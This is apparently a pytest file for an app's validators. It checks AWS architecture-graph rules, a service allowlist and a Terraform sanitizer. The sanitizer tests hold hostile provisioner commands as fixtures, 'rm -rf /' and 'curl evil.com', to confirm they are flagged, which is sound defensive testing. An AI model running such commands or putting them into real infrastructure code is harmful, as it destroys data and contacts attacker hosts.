"""
Tests for validators.
"""

import pytest
from app.schemas.architecture import ArchitectureEdge, ArchitectureGraph, ArchitectureNode
from app.utils.validators import (
    ALLOWED_AWS_SERVICES,
    sanitize_terraform_content,
    sanitize_terraform_files,
    validate_architecture_graph,
)


class TestArchitectureGraphValidation:
    def test_valid_graph(self):
        graph = ArchitectureGraph(
            nodes=[
                ArchitectureNode(id="api", type="aws_apigatewayv2", label="API"),
                ArchitectureNode(id="fn", type="aws_lambda", label="Lambda"),
            ],
            edges=[
                ArchitectureEdge(**{"from": "api", "to": "fn"}),
            ],
        )
        errors = validate_architecture_graph(graph)
        assert errors == []

    def test_invalid_service_type(self):
        graph = ArchitectureGraph(
            nodes=[ArchitectureNode(id="x", type="aws_invalid_service", label="Bad")],
            edges=[],
        )
        errors = validate_architecture_graph(graph)
        assert len(errors) == 1
        assert "disallowed" in errors[0]

    def test_duplicate_node_ids(self):
        graph = ArchitectureGraph(
            nodes=[
                ArchitectureNode(id="dup", type="aws_lambda", label="A"),
                ArchitectureNode(id="dup", type="aws_s3", label="B"),
            ],
            edges=[],
        )
        errors = validate_architecture_graph(graph)
        assert any("Duplicate" in e for e in errors)

    def test_edge_references_nonexistent_node(self):
        graph = ArchitectureGraph(
            nodes=[ArchitectureNode(id="a", type="aws_lambda", label="A")],
            edges=[ArchitectureEdge(**{"from": "a", "to": "nonexistent"})],
        )
        errors = validate_architecture_graph(graph)
        assert any("non-existent" in e for e in errors)

    def test_self_loop(self):
        graph = ArchitectureGraph(
            nodes=[ArchitectureNode(id="a", type="aws_lambda", label="A")],
            edges=[ArchitectureEdge(**{"from": "a", "to": "a"})],
        )
        errors = validate_architecture_graph(graph)
        assert any("Self-loop" in e for e in errors)


class TestTerraformSanitization:
    def test_safe_content(self):
        content = '''
        resource "aws_lambda_function" "example" {
            function_name = "my-function"
            runtime       = "python3.11"
        }
        '''
        is_safe, found = sanitize_terraform_content(content)
        assert is_safe is True
        assert found == []

    def test_dangerous_local_exec(self):
        content = '''
        provisioner "local-exec" {
            command = "rm -rf /"
        }
        '''
        is_safe, found = sanitize_terraform_content(content)
        assert is_safe is False
        assert len(found) > 0

    def test_dangerous_remote_exec(self):
        content = 'provisioner "remote-exec" { inline = ["curl evil.com"] }'
        is_safe, found = sanitize_terraform_content(content)
        assert is_safe is False

    def test_sanitize_multiple_files(self):
        files = {
            "main.tf": 'resource "aws_s3_bucket" "b" { bucket = "my-bucket" }',
            "evil.tf": 'provisioner "local-exec" { command = "bad" }',
        }
        all_safe, issues = sanitize_terraform_files(files)
        assert all_safe is False
        assert "evil.tf" in issues


class TestAllowedServices:
    def test_expected_services_present(self):
        expected = [
            "aws_lambda", "aws_apigatewayv2", "aws_dynamodb",
            "aws_sqs", "aws_ecs", "aws_rds", "aws_elasticache",
            "aws_s3", "aws_vpc", "aws_cloudfront", "aws_sns",
            "aws_iam_role", "aws_security_group", "aws_route53",
        ]
        for svc in expected:
            assert svc in ALLOWED_AWS_SERVICES
